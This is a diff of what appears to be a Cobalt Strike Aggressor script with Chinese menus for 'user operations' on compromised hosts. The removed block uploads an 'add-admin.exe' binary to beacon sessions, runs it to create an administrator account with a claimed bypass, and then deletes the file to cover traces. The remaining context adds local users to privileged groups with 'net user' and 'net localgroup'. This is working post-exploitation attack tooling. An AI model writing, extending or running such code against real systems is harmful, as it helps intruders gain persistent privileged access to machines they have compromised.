@@ -42,32 +42,6 @@ menu "用户操作" {
     				bshell($bid, "net user $Name $Pwd /add  && net localgroup $groups $Name /add");
 				}
 
-    	menu "添加管理员用户-bypass"{
-    		item "上传add-admin"{
-        	local('$bid');
-        	foreach $bid ($1){
-            bupload($1, script_resource("/script/add-admin.exe"));
-        		}
-        	}
-        	item "运行add-admin" {
-			$bid = $1['@'];
-			$dialog = dialog("add-admin", %(bid => $bid), &add_admin);
-            dbutton_action($dialog, "运行");
-			dialog_show($dialog);
-        	}
-        	item "删除add-admin"{
-        	local('$bid');
-        	foreach $bid ($1){
-            	bshell($1, "del /f /s /q add-admin.exe");
-        	}
-		}
-
-    	}
-
-sub add_admin{
-	bshell($bid, "add-admin.exe");
-}
-
 
     	menu "添加管理员用户$-bypass"{
     		item "上传add-user"{
